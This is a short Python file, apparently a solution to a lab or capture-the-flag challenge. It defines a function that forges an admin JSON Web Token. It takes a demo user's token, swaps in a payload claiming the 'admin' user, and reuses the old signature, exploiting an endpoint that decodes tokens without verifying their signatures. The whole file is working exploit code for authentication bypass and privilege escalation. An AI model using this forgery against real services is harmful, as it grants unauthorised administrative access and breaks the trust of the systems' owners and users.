import base64
import json


def forge_admin_jwt(original_jwt):
    """
    Exploits JWT forgery vulnerability by creating an admin token.

    The vulnerability: /dashboard only decodes the payload without
    verifying the signature, so we can craft any token we want.

    Args:
        original_jwt: A valid JWT from the demo user login

    Returns:
        Forged JWT token with admin privileges
    """
    # Split the original JWT into its components
    parts = original_jwt.split('.')
    header = parts[0]

    # Create a new payload claiming to be admin
    forged_payload = {
        "user": "admin"
    }

    # Encode the payload (without padding, as JWTs use base64url encoding)
    payload_json = json.dumps(forged_payload, separators=(',', ':'))
    payload_b64 = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip('=')

    # Create a dummy signature (doesn't matter since it's not verified)
    dummy_signature = parts[2] if len(parts) > 2 else "dummy"

    # Construct the forged JWT
    forged_jwt = f"{header}.{payload_b64}.{dummy_signature}"

    return forged_jwt
